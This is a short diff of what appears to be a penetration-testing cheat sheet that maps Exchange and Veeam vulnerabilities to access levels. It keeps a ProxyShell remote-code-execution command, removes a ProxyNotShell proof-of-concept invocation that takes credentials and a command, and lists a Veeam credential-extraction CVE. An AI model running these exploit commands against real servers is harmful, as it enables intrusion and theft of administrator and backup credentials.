@@ -26,8 +26,6 @@
 ## Exchange >>> Admin
 - Proxyshell @CVE@
   - `proxyshell_rce.py -u https://<exchange> -e administrator@<domain>`
-- ProxyNotShell @CVE@
-  - `poc_aug3.py <host> <username> <password> <command>`
 
 ## Veeam >>> User Account || Low access || Admin
 - CVE-2023-27532 (creds - Veeam backup) @CVE@
